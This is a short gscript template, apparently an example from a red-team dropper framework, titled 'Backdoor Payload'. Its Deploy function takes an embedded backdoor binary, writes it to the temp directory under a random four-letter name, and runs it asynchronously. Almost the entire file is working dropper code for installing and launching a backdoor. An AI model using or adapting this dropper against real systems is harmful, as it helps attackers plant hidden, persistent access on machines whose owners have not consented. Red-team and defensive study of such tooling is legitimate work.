// Example gscript template
// Title: Backdoor Payload
// Author: Javier Rojas
// Purpose: Drops a backdoor payload
// Gscript version: 1.0.0
// ATT&CK: 

//priority:3
//timeout:100

//import:./backdoorPayload

//go_import:os as os

function Deploy() {  
    console.log("Starting to drop backdoor payload...");
    // Getting our asset
    var backdoorBin = GetAssetAsBytes("backdoorPayload");
    console.log("errors getting the payload: "+Dump(backdoorBin[1]));
    // Getting a random string
    var temppath = os.TempDir();
    var naming = G.rand.GetAlphaString(4);
    naming = naming.toLowerCase();
    fullpath = temppath+"/"+naming;
    console.log("file name: "+ fullpath);
    // Write payload
    errors = G.file.WriteFileFromBytes(fullpath, backdoorBin[0]);
    console.log("errors writing: "+Dump(errors));
    // Run payload
    var running = G.exec.ExecuteCommandAsync(fullpath, [""]);
    console.log("errors running: "+Dump(running[1]));
    return true
}

